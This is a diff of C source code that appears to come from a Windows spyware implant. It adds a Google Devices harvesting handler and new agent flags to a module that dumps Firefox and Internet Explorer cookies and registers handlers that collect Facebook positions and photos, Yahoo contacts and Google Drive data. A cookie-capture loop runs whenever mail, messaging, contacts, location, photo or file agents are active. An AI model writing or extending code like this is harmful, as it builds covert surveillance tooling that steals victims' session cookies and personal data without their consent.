@@ -27,6 +27,7 @@ extern DWORD YahooContactHandler(char *); // Handler per Yahoo
 extern DWORD HandleGoogleDrive(char *);
 extern DWORD HandleFacebookPositions(char *); // Handler for Facebook positions
 extern DWORD HandleFacebookPhoto(char *); // Handler for Facebook photo
+extern DWORD HandleGoogleDevices(char *);
 
 extern int DumpFFCookies(void); // Cookie per Facebook
 extern int DumpIECookies(WCHAR *); // Cookie per IExplorer
@@ -41,6 +42,8 @@ extern BOOL bPM_MailCapStarted;
 extern BOOL bPM_ContactsStarted;
 extern BOOL bPM_LocationStarted;
 extern BOOL bPM_PhotosStarted;
+extern BOOL bPM_FileAgentStarted;
+extern BOOL bPM_GoogleDeviceStarted;
 
 social_entry_struct social_entry[SOCIAL_ENTRY_COUNT];
 
@@ -236,9 +239,10 @@ void InitSocialEntries()
 	social_entry[8].RequestHandler = HandleFacebookPositions;
 	wcscpy_s(social_entry[9].domain, FACEBOOK_DOMAIN);
 	social_entry[9].RequestHandler = HandleFacebookPhoto;
-	wcscpy_s(social_entry[10].domain, GDRIVE_DOMAIN);	 // N.B.: this must be the last handler to be registered
-	social_entry[10].RequestHandler = HandleGoogleDrive; // 
-
+	wcscpy_s(social_entry[10].domain, GDRIVE_DOMAIN);	 
+	social_entry[10].RequestHandler = HandleGoogleDevices;
+	wcscpy_s(social_entry[11].domain, GDRIVE_DOMAIN);	 // N.B.: this must be the last handler to be registered
+	social_entry[11].RequestHandler = HandleGoogleDrive; // 
 	
 	// Azzera i cookie in shared mem relativi a IExplorer
 	ZeroMemory(FACEBOOK_IE_COOKIE, sizeof(FACEBOOK_IE_COOKIE));
@@ -269,7 +273,7 @@ void SocialMainLoop()
 
 
 		// Se tutti gli agenti sono fermi non catturo nemmeno i cookie
-		if (!bPM_IMStarted && !bPM_MailCapStarted && !bPM_ContactsStarted && !bPM_LocationStarted && !bPM_PhotosStarted)
+		if (!bPM_IMStarted && !bPM_MailCapStarted && !bPM_ContactsStarted && !bPM_LocationStarted && !bPM_PhotosStarted && !bPM_FileAgentStarted && !bPM_GoogleDeviceStarted)
 			continue;
 
 
